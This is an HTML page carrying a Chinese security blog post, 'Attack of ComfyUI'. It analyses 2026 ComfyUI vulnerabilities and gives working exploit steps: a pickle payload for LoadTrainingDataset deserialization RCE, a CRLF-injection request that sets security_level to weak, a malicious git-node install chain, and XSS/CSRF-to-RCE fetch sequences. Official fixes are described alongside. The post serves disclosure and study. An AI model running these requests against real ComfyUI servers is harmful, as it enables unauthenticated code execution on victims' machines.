@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="刚听了Founder of ComfyUI 的线上talk，对这个经常爆洞的 Stable Diffusion 网红产品又起了兴趣🤔  这是一个很有意思的 Json to Workflow 编排工具，尽管当前 not Agent-friendly enough，产品已在尝试用 MCP 去解决这个问题：https:&#x2F;&#x2F;blog.comfy.org&#x2F;p&#x2F;comfy-mcp-turn-your-age">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack of ComfyUI">
+<meta property="og:url" content="https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/">
+<meta property="og:site_name" content="Z3r4y｜Take it easy">
+<meta property="og:description" content="刚听了Founder of ComfyUI 的线上talk，对这个经常爆洞的 Stable Diffusion 网红产品又起了兴趣🤔  这是一个很有意思的 Json to Workflow 编排工具，尽管当前 not Agent-friendly enough，产品已在尝试用 MCP 去解决这个问题：https:&#x2F;&#x2F;blog.comfy.org&#x2F;p&#x2F;comfy-mcp-turn-your-age">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/cover.jpg">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/0-comfyui-ui.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/1-upload-image-plant-pickle.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/2-prompt-trigger-rce.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/fix-68771-weights-only.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/17-burp-22777-git-install-403.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/18-burp-22777-crlf-inject-db_mode.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/19-burp-22777-reboot.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/20-burp-22777-git-install-rce.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/fix-22777-crlf-sanitize.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/6-burp-6593-svg-xss-chain.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/7-burp-6593-view-inline-svg.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/12-burp-56672-userdata-xss-upload.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/13-browser-56672-userdata-xss-rce.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/fix-14734-routes-mime.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/5-burp-6589-csrf-bypass.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/9-firefox-sandbox-iframe-csrf-rce.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/fix-6589-sec-fetch-site.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/14-burp-56671-model-preview-traversal.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/3-burp-6591-prompt-loadimage.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/4-burp-6591-view-exfil.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/victim-hacker.png">
+<meta property="og:image" content="https://z3r4y.github.io/images/22/fix-14734-folder-paths.png">
+<meta property="article:published_time" content="2026-08-08T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-08T09:19:34.632Z">
+<meta property="article:author" content="Z3r4y">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z3r4y.github.io/images/22/cover.jpg">
+    
+    
+      <meta name="google-site-verification" content="5XKznQqqg14CSMKePYUh0Fo_1E543E2Uxt6L5AqvL-Q">
+    
+    
+      <link rel="canonical" href="https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Attack of ComfyUI | Z3r4y</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Z3r4y｜Take it easy" type="application/atom+xml">
+<link rel="alternate" href="/rss.xml" title="Z3r4y｜Take it easy" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Z3r4y">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2026/08/06/ScopeJudge%EF%BC%9AOPSEC%20Gating%20%E4%B8%8D%E5%9C%A8%E5%8A%A8%E4%BD%9C%E9%87%8C%EF%BC%8C%E5%9C%A8%E6%84%8F%E5%9B%BE%E9%87%8C/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&text=Attack of ComfyUI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&is_video=false&description=Attack of ComfyUI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attack of ComfyUI&body=Check out this article: https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&title=Attack of ComfyUI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&name=Attack of ComfyUI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://z3r4y.github.io/2026/08/08/Attack%20of%20ComfyUI/&t=Attack of ComfyUI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A7%88%E8%A1%A8"><span class="toc-number">1.</span> <span class="toc-text">概览表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-68771%EF%BC%88LoadTrainingDataset-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2026-68771（LoadTrainingDataset pickle 反序列化 RCE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-22777%EF%BC%88ComfyUI-Manager-CRLF-%E6%B3%A8%E5%85%A5-RCE%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2026-22777（ComfyUI-Manager CRLF 注入 -&gt; RCE）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loopback-Bind%E6%94%BB%E5%87%BB%E9%9D%A2%EF%BC%9AXSS-CSRF-RCE-%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">Loopback Bind攻击面：XSS&#x2F;CSRF -&gt; RCE 链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6593-CVE-2026-56670%EF%BC%88-view-%E7%AB%AF%E7%82%B9-SVG-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2026-6593 &#x2F; CVE-2026-56670（&#x2F;view 端点 SVG 存储型 XSS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6592-CVE-2026-56672%EF%BC%88-userdata-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2026-6592 &#x2F; CVE-2026-56672（&#x2F;userdata 存储型 XSS）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">5.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6589"><span class="toc-number">5.1.</span> <span class="toc-text">CVE-2026-6589</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E8%AF%BB%E5%8F%96"><span class="toc-number">6.</span> <span class="toc-text">图片读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6590-CVE-2026-56671%EF%BC%88Model-Preview-%E7%AB%AF%E7%82%B9%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">CVE-2026-6590 &#x2F; CVE-2026-56671（Model Preview 端点路径穿越）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-6591-CVE-2026-56673%EF%BC%88LoadImage-%E6%97%8F%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">CVE-2026-6591 &#x2F; CVE-2026-56673（LoadImage 族路径穿越）</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Attack of ComfyUI
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Z3r4y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-08-08T04:00:00.000Z" class="dt-published" itemprop="datePublished">2026-08-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>刚听了Founder of ComfyUI 的线上talk，对这个经常爆洞的 Stable Diffusion 网红产品又起了兴趣🤔</p>
+<p><img src="/images/22/cover.jpg" alt="cover"></p>
+<p>这是一个很有意思的 Json to Workflow 编排工具，尽管当前 not Agent-friendly enough，产品已在尝试用 MCP 去解决这个问题：<a target="_blank" rel="noopener" href="https://blog.comfy.org/p/comfy-mcp-turn-your-agent-into-a">https://blog.comfy.org/p/comfy-mcp-turn-your-agent-into-a</a></p>
+<p>“Everything is now in natural language. No nodes, no download, no GPU, no node graphs if you don’t want them.”<br><img src="/images/22/0-comfyui-ui.png" alt="image1"></p>
+<p>但什么时候Workflow会消失呢？也许当模型<strong>端到端</strong>原生生图&#x2F;视频能力强到：能可靠地保持一致性、支持批量控制、可以精确指定风格参数——将”控制点”吸收进模型能力本身。haha，模型最终会吃掉大部分harness。</p>
+<style>
+/* 概览表：CVE 编号不折行（主题 .content 的 overflow-wrap:break-word 会把长 token 硬折行） */
+.e-content h2 + table th:first-child,
+.e-content h2 + table td:first-child {
+  min-width: 130px;
+}
+</style>
+
+<h2 id="概览表"><a href="#概览表" class="headerlink" title="概览表"></a>概览表</h2><table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>类型</th>
+<th>发布时间</th>
+<th>影响版本范围</th>
+<th>主要影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2026-68771</td>
+<td>LoadTrainingDataset pickle 反序列化 RCE</td>
+<td>2026-07-30</td>
+<td>0 ~ 0.23.0（前提：PyTorch &lt; 2.6）</td>
+<td>以 ComfyUI 进程权限执行任意命令</td>
+</tr>
+<tr>
+<td>CVE-2026-6593 &#x2F; CVE-2026-56670</td>
+<td>&#x2F;view 端点 SVG 存储型 XSS</td>
+<td>2026-04-18（VulDB）&#x2F; 2026-07-31（GHSA）</td>
+<td>&lt; 0.28.0</td>
+<td>同源脚本执行，链式提权到 RCE（需诱导打开 &#x2F;view）</td>
+</tr>
+<tr>
+<td>CVE-2026-6590 &#x2F; CVE-2026-56671</td>
+<td>&#x2F;experiment&#x2F;models&#x2F;preview 路径穿越任意图片读</td>
+<td>2026-04-18（VulDB）&#x2F; 2026-07-31（GHSA）</td>
+<td>&lt; 0.28.0</td>
+<td>读取任意图像可解码文件、路径枚举</td>
+</tr>
+<tr>
+<td>CVE-2026-6592 &#x2F; CVE-2026-56672</td>
+<td>&#x2F;userdata 端点存储型 XSS</td>
+<td>2026-04-18（VulDB）&#x2F; 2026-07-31（GHSA）</td>
+<td>&lt; 0.28.0</td>
+<td>同源脚本执行、窃取浏览器 API token，链式 RCE（需诱导打开 URL）</td>
+</tr>
+<tr>
+<td>CVE-2026-6591 &#x2F; CVE-2026-56673</td>
+<td>LoadImage 族路径穿越任意图片读</td>
+<td>2026-04-18（VulDB）&#x2F; 2026-07-31（GHSA）</td>
+<td>&lt; 0.28.0</td>
+<td>任意路径探测 + 图片文件外带</td>
+</tr>
+<tr>
+<td>CVE-2026-6589</td>
+<td>Origin 中间件 CSRF 绕过</td>
+<td>2026-04-18</td>
+<td>&lt; 0.19.0</td>
+<td>CSRF -&gt; 上传恶意 pickle + 触发 &#x2F;prompt -&gt; RCE（需受害者浏览器访问攻击页）</td>
+</tr>
+<tr>
+<td>CVE-2026-22777</td>
+<td>ComfyUI-Manager CRLF 注入 -&gt; config.ini 配置篡改</td>
+<td>2026-01-09</td>
+<td>&lt; 3.39.2 &#x2F; &lt; 4.0.5</td>
+<td>注入 security_level&#x3D;weak -&gt; git_url 装恶意节点 -&gt; RCE</td>
+</tr>
+</tbody></table>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>两条独立的 RCE 入口：内核 LoadTrainingDataset 的 pickle 反序列化（CVE-2026-68771，CVSS 9.8），以及 ComfyUI-Manager 的 CRLF 注入 -&gt; 配置篡改 -&gt; 恶意节点安装（CVE-2026-22777，CVSS 7.5）。</p>
+<h3 id="CVE-2026-68771（LoadTrainingDataset-pickle-反序列化-RCE）"><a href="#CVE-2026-68771（LoadTrainingDataset-pickle-反序列化-RCE）" class="headerlink" title="CVE-2026-68771（LoadTrainingDataset pickle 反序列化 RCE）"></a>CVE-2026-68771（LoadTrainingDataset pickle 反序列化 RCE）</h3><p>ComfyUI 中最严重的一个：未认证 pickle 反序列化 RCE，CVSS 9.8（V3.1）&#x2F; 9.3（V4，Critical），CWE-502。</p>
+<p><strong>原理</strong></p>
+<p>comfy_extras&#x2F;nodes_dataset.py 的 LoadTrainingDataset.execute() 用 torch.load(f) 反序列化数据集 shard 文件——这是整个仓库<strong>唯一</strong>没有传 weights_only&#x3D;True 的 torch.load 调用点（其余调用点 comfy&#x2F;utils.py:155、comfy&#x2F;sd1_clip.py:455 都带了）。</p>
+<p>PyTorch &lt; 2.6 的 torch.load 默认 weights_only&#x3D;False，会完整走 pickle 反序列化，攻击者用 __reduce__ 即可在反序列化时执行任意 Python 代码。torch &gt;&#x3D; 2.6 默认 weights_only&#x3D;True，因此漏洞成立的前提是旧版 PyTorch（本地用 TORCH_FORCE_NO_WEIGHTS_ONLY_LOAD&#x3D;1 模拟）。</p>
+<blockquote>
+<p>注意 ComfyUI 的 requirements.txt 并不锁 torch 版本，默认安装会拿到 &gt;&#x3D; 2.6 的 torch，实际中招的是把 torch 锁在 &lt; 2.6 的环境（老镜像、整合包，或显式设置该环境变量）。</p>
+</blockquote>
+<p><strong>攻击链</strong></p>
+<ol>
+<li>POST &#x2F;upload&#x2F;image（type&#x3D;output + subfolder&#x3D;training_dataset_* + 文件名 shard_0000.pkl）——恶意 pickle 原样落入 output&#x2F;training_dataset_*&#x2F;shard_0000.pkl，服务端完全不校验内容；</li>
+<li>POST &#x2F;prompt 提交包含 LoadTrainingDataset(folder_name&#x3D;…) 的工作流——torch.load(f) 反序列化，<strong>reduce</strong> 执行系统命令；</li>
+</ol>
+<p><img src="/images/22/1-upload-image-plant-pickle.png" alt="image2"><br>上传的 shard_0000.pkl，pickle 载荷里是 __import__(‘os’).system(‘open -a Calculator’)</p>
+<p><img src="/images/22/2-prompt-trigger-rce.png" alt="image3"><br>POST &#x2F;prompt 触发 LoadTrainingDataset，prompt_id 返回 200，Calculator 进程弹出</p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/pull/14543">PR #14543</a>（commit <a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI/commit/94ee49b1612824366a8631ea069b2a1fa5c73720">94ee49b</a>）——给 LoadTrainingDataset 的 torch.load 补上 weights_only&#x3D;True，与仓库内其他调用点对齐。披露方：<a target="_blank" rel="noopener" href="https://www.vulncheck.com/advisories/comfyui-unauthenticated-rce-via-loadtrainingdataset-pickle-deserialization">VulnCheck</a>（credit：Bofei Chen），公开 PoC 已存在（<a target="_blank" rel="noopener" href="https://github.com/0xdak/CVE-2026-68771_exploit">0xdak&#x2F;CVE-2026-68771_exploit</a>）。</p>
+<p><img src="/images/22/fix-68771-weights-only.png" alt="image4"><br>commit 94ee49b（PR #14543）：torch.load 补上 weights_only&#x3D;True，与仓库内其他调用点对齐</p>
+<h3 id="CVE-2026-22777（ComfyUI-Manager-CRLF-注入-RCE）"><a href="#CVE-2026-22777（ComfyUI-Manager-CRLF-注入-RCE）" class="headerlink" title="CVE-2026-22777（ComfyUI-Manager CRLF 注入 -&gt; RCE）"></a>CVE-2026-22777（ComfyUI-Manager CRLF 注入 -&gt; RCE）</h3><p>ComfyUI-Manager 是官方生态里装机量最大的扩展（不是内核自带，但官方文档推荐安装，一键包&#x2F;云镜像基本默认带），它给 ComfyUI 加了一堆<strong>默认无认证</strong>的管理路由（&#x2F;manager&#x2F;*、&#x2F;customnode&#x2F;*），攻击面比内核还大。</p>
+<p><strong>背景：CVE-2025-67303</strong>（腾讯玄武实验室 2026-01 披露，修复 v3.38，<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-95pq-hr8p-f5g7">GHSA-95pq-hr8p-f5g7</a>）：Manager 把配置和关键数据放在 web 可访问的位置（CWE-420 未受保护替代通道），任意文件上传可篡改配置&#x2F;覆盖数据，进而 RCE。修复方式是把数据迁移到 web 根之外（<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md">v3.38-userdata-security-migration</a>）。</p>
+<p>Manager 的配置处理存在 CRLF 注入（CVSS 7.5，<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2">GHSA-562r-8445-54r2</a>，credit：李存义 &#x2F; D0n9 Li &#x2F; Swings &#x2F; Osword，奇安信 SGLAB）。</p>
+<p><strong>CRLF 注入为什么存在</strong></p>
+<p>GET &#x2F;manager&#x2F;db_mode 会把 value 参数<strong>原样</strong>存进 get_config()[‘db_mode’]，随后 write_config() 用 ConfigParser 把它写进 user&#x2F;__manager&#x2F;config.ini。value 里的 CRLF（%0d%0a）没有被消毒，ConfigParser 会把换行后面的内容当成<strong>新的配置键值对</strong>——于是攻击者可以在不改代码的情况下覆盖任意配置项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /manager/db_mode?value=zzz%0dsecurity_level%20%3d%20weak</span><br></pre></td></tr></table></figure>
+
+<p>写进 config.ini 的效果：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">db_mode</span> = zzz</span><br><span class="line"><span class="attr">security_level</span> = weak</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用链</strong></p>
+<ol>
+<li><strong>注入</strong>：GET &#x2F;manager&#x2F;db_mode?value&#x3D;zzz%0dsecurity_level%20%3d%20weak -&gt; 200，config.ini 多出 security_level &#x3D; weak；</li>
+<li><strong>重启</strong>：GET &#x2F;manager&#x2F;reboot 让配置生效；</li>
+<li><strong>装恶意节点</strong>：POST &#x2F;customnode&#x2F;install&#x2F;git_url（body：git:&#x2F;&#x2F;127.0.0.1:9418&#x2F;evilnode.git）。弱化前 Manager 返回 403 {“error”: “security_level”}，弱化后返回 200——Manager 拉起 git clone + install.py，恶意自定义节点的安装脚本直接执行，RCE。</li>
+</ol>
+<p><img src="/images/22/17-burp-22777-git-install-403.png" alt="image22"><br>弱化前：POST &#x2F;customnode&#x2F;install&#x2F;git_url -&gt; 403 {“error”: “security_level”}</p>
+<p><img src="/images/22/18-burp-22777-crlf-inject-db_mode.png" alt="image23"><br>CRLF 注入：GET &#x2F;manager&#x2F;db_mode?value&#x3D;zzz%0dsecurity_level%20%3d%20weak -&gt; 200</p>
+<p><img src="/images/22/19-burp-22777-reboot.png" alt="image24"><br>GET &#x2F;manager&#x2F;reboot 重启 Manager 使配置生效</p>
+<p><img src="/images/22/20-burp-22777-git-install-rce.png" alt="image25"><br>弱化后：同样的 POST &#x2F;customnode&#x2F;install&#x2F;git_url -&gt; 200，恶意节点安装脚本执行 -&gt; RCE。Manager 的安装逻辑是：把 git_url clone 进 custom_nodes&#x2F; 后，仓库根目录存在 install.py 就用 Manager 自身 Python（sys.executable）执行它，所以克隆内容本身就是 RCE 载荷</p>
+<p><strong>官方FIX</strong>：<a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2">3.39.2 &#x2F; 4.0.5</a>（commit <a target="_blank" rel="noopener" href="https://github.com/Comfy-Org/ComfyUI-Manager/commit/f4fa394e0f03b013f1068c96cff168ad10bd0410">f4fa394</a>），对写入 config.ini 的输入做 CRLF 消毒。</p>
+<p><img src="/images/22/fix-22777-crlf-sanitize.png" alt="image26"><br>commit f4fa394（3.39.2）：write_config 对所有字符串值做 CRLF 消毒（Sanitize config string values to prevent CRLF injection attacks）</p>
+<h2 id="Loopback-Bind攻击面：XSS-CSRF-RCE-链"><a href="#Loopback-Bind攻击面：XSS-CSRF-RCE-链" class="headerlink" title="Loopback Bind攻击面：XSS&#x2F;CSRF -&gt; RCE 链"></a>Loopback Bind攻击面：XSS&#x2F;CSRF -&gt; RCE 链</h2><p>下列 RCE 以 pickle 为例（CRLF 那条也可以打）</p>
+<p>单个 XSS 或 CSRF 在 CVSS 上都不高，但 ComfyUI 的攻击面是「<strong>XSS&#x2F;CSRF 只是入口，pickle RCE 是终点</strong>」。因为 ComfyUI 默认无认证，攻击者拿到一个同源执行点（XSS）或任意请求通道（CSRF）后，剩下的两步都是未认证的普通 API 调用：</p>
+<p><strong>链 A（存储型 XSS -&gt; RCE，v0.23.0 实测）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传恶意 SVG/HTML（6593/56670、6592/56672 任一入口）</span><br><span class="line">-&gt; 受害者打开 /view?filename=...svg 或 /userdata/...html</span><br><span class="line">-&gt; 同源执行：fetch(&#x27;/upload/image&#x27;, multipart) 上传恶意 shard_*.pkl</span><br><span class="line">-&gt; fetch(&#x27;/prompt&#x27;) 触发 LoadTrainingDataset</span><br><span class="line">-&gt; open -a Calculator 弹出</span><br></pre></td></tr></table></figure>
+
+<p>XSS 的价值在于<strong>绕过 CSRF 防线</strong>：v0.23.0 上远程跨站请求被 Sec-Fetch-Site: cross-site 挡死，而存储型 XSS 是同源执行——同源请求没有 CORS 预检，Origin&#x2F;Sec-Fetch-Site 都是 same-origin，服务端无从区分，直接放行。代价是需要受害者打开一次恶意文件 URL（UI:R），所以 GHSA 只评 8.2 分——但 ComfyUI 用户浏览自己生成的图片是常态，实际就是 1 Click RCE。</p>
+<p><strong>链 B（CSRF -&gt; RCE）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data: 页 / sandbox iframe（Origin: null）</span><br><span class="line">-&gt; POST /upload/image + POST /prompt 到 127.0.0.1 ComfyUI</span><br><span class="line">-&gt; pickle 反序列化 RCE</span><br></pre></td></tr></table></figure>
+
+<p>浏览器路径成不成立<strong>取决于浏览器层的 PNA</strong>，不是所有浏览器都打得通：</p>
+<ul>
+<li><strong>Firefox（未实现 PNA）实测打通</strong>：&lt; 0.19.0 上 data: 页 &#x2F; sandbox iframe（Origin: null）直连 127.0.0.1:8188，probe &#x2F; upload &#x2F; prompt 全部送达 -&gt; RCE（见 9-firefox-sandbox-iframe-csrf-rce.png）；</li>
+<li><strong>Chrome 130+ 打不通</strong>：PNA 把「public 地址空间页面 -&gt; 127.0.0.1」的请求拦在浏览器层（TypeError: Failed to fetch，服务端零请求），data: 页和公网页都不行。</li>
+</ul>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>ComfyUI 的 XSS 全是存储型：&#x2F;view 与 &#x2F;userdata 两个端点把用户上传&#x2F;写入的内容按危险 MIME 内联返回，脚本在 ComfyUI 源执行，同源请求直接绕过 CSRF 防线。2026-04 VulDB 先披露（6593&#x2F;6592，按「低权限」评 3.5 分），2026-07 官方 GHSA 收编为 56670&#x2F;56672，按「未认证」重评 8.2 分——同一批根因，官方在 v0.28.0（PR #14734）统一把危险 MIME 强制为下载。</p>
